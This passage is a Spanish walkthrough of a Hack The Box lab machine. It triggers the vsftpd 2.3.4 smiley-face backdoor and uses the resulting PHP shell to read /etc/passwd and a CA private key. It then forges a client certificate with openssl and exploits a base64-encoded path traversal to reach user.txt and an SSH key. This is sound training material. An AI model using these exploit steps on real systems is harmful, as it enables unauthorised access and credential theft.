## Vulnerability Assessment {-}

### vsftpd 2.3.4 {-}

Como ya sabemos que esta version es vulnerable, buscando por internet o analyzando el exploit de Metasploit vemos que la vulnerabilidad
reside en poner una sonrisita `:)` al final del nombre de usuario y esto hace que se habre el puerto 6200 de la maquina.

```bash
nc 10.10.10.131 6200

#Output
Ncat: Connection refused.

telnet 10.10.10.131 21
USER s4vitar:)
PASS setenso
```

se queda bloqueado, podemos cerrar la ventana y con nc intentamos nuevamente la coneccion al puerto 6200.

```bash
nc 10.10.10.131 6200
```

Intentamos enviar commandos

```bash
whoami
#Error PHP Warning: Use of undefined constant whoami - assumed 'whoami' (this will throw an Error in a future version of PHP)
```

Intentamos commandos **PHP**

```bash
exec("whoami")
#error
shell_exec("whoami")
#error
passthru("whoami")
#error
system("whoami")
#error
help
#Output
help
ls
dump
doc
show
wtf
...
```

Vemos cosas intentamos con **ls** ver las variables classes funcciones y mas

```bash
ls
#Output
$tokyo
```

Miramos el contenido con show

```bash
show $tokyo
#output
class Tokyo {
    private function sign($caCert, $userCsr){
        ...
    }
}
```

Aqui vemos la class Tokyo con su funccion private. Podemos ver que en el directorio `/home/nairobi/ca.key` hay una key. Como este servicio
esta en php, miramos si podemos listar contenido de ficheros con las fucciones php `file_get_contents()`, `scandir()` o `readfile()`

```bash
file_get_contents("/etc/passwd")
```

Y podemos ver el `/etc/passwd`, miramos si podemos ver la key del usuario nairobi.

miramos si encontramos id_rsa

```bash
scandir("/")
scandir("/home")
scandir("/home/berlin/.ssh")
scandir("/home/nairobi/.ssh")
scandir("/home/oslo/.ssh")
scandir("/home/dali/.ssh")
scandir("/home/professor/.ssh")
```

No encontramos nada. Miramos el contenido del fichero key.

```bash
readfile("/home/nairobi/ca.key")
```

Ahora que tenemos la key podemos crear un certificado de cliente valido.

### Creamos un certificado de cliente valido {-}

1. Tenemos que recuperar el certificado del servidor

   ```bash
    openssl s_client -connect 10.10.10.131:443
    openssl s_client -connect 10.10.10.131:443 | openssl x509
    openssl s_client -connect 10.10.10.131:443 | openssl x509 > ca.cer
    ```

1. Copiamos el contenido del ca.key en un fichero ca.key

    - Aqui tenemos 2 ficheros el ca.key y el ca.cer

1. Con openssl creamos un private key

    ```bash
    openssl genrsa -out client.key 4096
    ```

1. Creamos un .req

    ```bash
    openssl req -new -key client.key -out client.req
    ```

    en commonName ponemos lacasadepapel.htb en el resto le damos al enter.

1. Firmamos el certificado

    ```bash
    openssl x509 -req -in client.req -set_serial 123 -CA ca.cer -CAkey ca.key -days 365 -extensions client -outform PEM -out client.cer
    ```

    Aqui ya tenemos un certificado cliente valido. Pero ahora tenemos que convertirlo en un `.p12` para que los navegadores los accepten.

1. Conversion en certificado pkcs12 para navegadores

    ```bash
    openssl pkcs12 -export -inkey client.key -in client.cer -out client.p12
    chmod 777 client.p12
    ```


Aqui ya podemos a√±adir a firefox el certificado firmado. En firefox vamos a `ajustes` y buscamos por `cert`. Damos a `Ver certificado` y en el menu `Sus certificados`
le podemos dar a `importar`. Importamos el `client.p12` y le damos a acceptar. 

Si recargamos la pagina `https://lacasadepapel.htb` y acceptamos el certificado, ya podemos ver que el contenido a cambiado y un private arena es visible.

### Pathtraversal con base64 {-}

Aqui vemos dos Seasons y si le damos a una vemos unos ficheros `.avi` y haciendo hovering bemos que los nombres son en base64. Lo comprobamos con un fichero.

```bash
echo 'U0VBU09OLTEvMDMuYXZp' | base64 -d;echo
#Output
SEASON-1/03.avi
```

En la url vemos que tenemos algo como `https://lacasadepapel.htb/?path=SEASON-1`. Miramos lo que pasa si le damos a `https://lacasadepapel.htb/?path=/etc/passwd` y
salta un error como no existe el path en `/home/berlin/download//etc/passwd` y que usa la funccion scandir para esto. Ya pensamos en un path traversal, pero como es
un scandir solo podemos ir a por directorios.

```bash
https://lacasadepapel.htb/?path=../
```

aqui vemos el user.txt.

```bash
echo -n '../user.txt' | base64
#Output
Li4vdXNlci50eHQ=
```

y si vamos ahora a la url `https://lacasadepapel.htb/file/Li4vdXNlci50eHQ=` vemos que podemos descargar el user.txt. Pero a nosotros nos interessa ganar accesso
al systema.

En la url `https://lacasadepapel.htb/?path=../` vemos que podemos pinchar al directorio `.ssh` y a dentro hay una `id_rsa`. Hacemos lo mismos que con el user.txt

